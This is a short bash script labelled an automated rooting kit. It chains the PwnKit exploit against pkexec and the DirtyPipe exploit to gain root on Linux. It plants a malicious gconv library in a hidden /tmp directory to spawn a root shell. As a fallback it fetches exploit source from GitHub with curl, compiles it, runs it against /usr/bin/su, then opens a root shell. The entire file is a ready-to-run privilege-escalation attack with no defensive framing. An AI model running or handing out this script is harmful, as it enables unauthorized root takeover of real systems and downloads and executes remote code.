#!/bin/bash
# AIO Root Exploit for Kernel 5.4.17 (DirtyPipe & PwnKit)
# Optimized for Oracle/RHEL systems

echo "[!] Starting Automated Rooting Kit..."

# --- METHOD 1: PwnKit (CVE-2021-4034) ---
echo "[*] Attempting Method 1: PwnKit..."
mkdir -p /tmp/.pwn && cd /tmp/.pwn
cat > pwn.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    setgroups(0);
    execve("/bin/sh", NULL, NULL);
    exit(0);
}
EOF
gcc -shared -fPIC pwn.c -o pwn.so 2>/dev/null
mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'
mkdir -p pwnkit; echo "module UTF-8// PWNKIT// pwnkit 2" > pwnkit/gconv-modules
cp pwn.so pwnkit/pwn.so
env -i "pwnkit" PATH="GCONV_PATH=." CHARSET=PWNKIT SHELL=pwnkit /usr/bin/pkexec

# --- METHOD 2: DirtyPipe (CVE-2022-0847) ---
if [ $(id -u) -ne 0 ]; then
    echo "[*] Method 1 failed. Attempting Method 2: DirtyPipe..."
    curl -sL https://raw.githubusercontent.com/Aris-A-G/CVE-2022-0847-DirtyPipe-Exploit/main/dirtypipez.c -o d.c
    gcc d.c -o d 2>/dev/null
    ./d /usr/bin/su
fi

# --- Check Result ---
if [ $(id -u) -eq 0 ]; then
    echo "[+] SUCCESS: YOU ARE ROOT!"
    /bin/sh
else
    echo "[-] All automated methods failed. Manual enumeration required."
fi